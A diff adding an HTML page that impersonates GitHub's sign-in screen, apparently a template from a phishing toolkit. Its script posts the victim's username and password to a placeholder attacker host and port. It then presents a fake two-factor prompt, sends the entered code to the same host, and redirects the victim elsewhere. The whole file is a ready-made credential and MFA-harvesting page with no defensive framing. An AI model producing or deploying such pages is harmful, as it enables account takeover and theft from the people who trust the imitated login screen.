@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to GitHub · GitHub</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #f6f8fa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #24292f; }
+        .container { background: white; padding: 20px; border-radius: 6px; width: 300px; border: 1px solid #d0d7de; box-shadow: 0 3px 6px rgba(140,149,159,0.15); }
+        h1 { font-size: 24px; font-weight: 300; text-align: center; margin-bottom: 15px; }
+        label { font-size: 14px; font-weight: 600; display: block; margin-bottom: 5px; }
+        input { width: 100%; padding: 5px 12px; margin-bottom: 15px; border: 1px solid #d0d7de; border-radius: 6px; box-sizing: border-box; font-size: 14px; line-height: 20px; background-color: #f6f8fa; }
+        input:focus { border-color: #0969da; outline: none; box-shadow: 0 0 0 3px rgba(9,105,218,0.3); background-color: #ffffff; }
+        button { width: 100%; padding: 5px 16px; background-color: #2da44e; color: white; border: 1px solid rgba(27,31,36,0.15); border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; line-height: 20px; }
+        button:hover { background-color: #2c974b; }
+        .step-hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div>
+        <h1>Sign in to GitHub</h1>
+        <div class="container" id="login-box">
+            <form id="step1">
+                <label>Username or email address</label>
+                <input type="text" id="email" required>
+                <label>Password</label>
+                <input type="password" id="pass" required>
+                <button type="button" onclick="submitStep1()">Sign in</button>
+            </form>
+
+            <form id="step2" class="step-hidden">
+                <label>Two-factor authentication</label>
+                <p style="font-size: 12px; color: #57606a;">Enter the 6-digit code from your authenticator app or security key.</p>
+                <input type="text" id="mfa" placeholder="XXXXXX" autocomplete="off" required>
+                <button type="button" onclick="submitStep2()">Verify</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function submitStep1() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            if(!email || !pass) return;
+            fetch("http://{{LHOST}}:{{LPORT}}/auth", { method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`
+            }).then(() => { document.getElementById('step1').classList.add('step-hidden'); document.getElementById('step2').classList.remove('step-hidden'); });
+        }
+
+        function submitStep2() {
+            const email = document.getElementById('email').value;
+            const mfa = document.getElementById('mfa').value;
+            if(!mfa) return;
+            fetch("http://{{LHOST}}:{{LPORT}}/mfa", { method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: `email=${encodeURIComponent(email)}&mfa_token=${encodeURIComponent(mfa)}`
+            }).then(() => { window.location.href = "{{REDIRECT_URL}}"; });
+        }
+    </script>
+</body>
+</html>
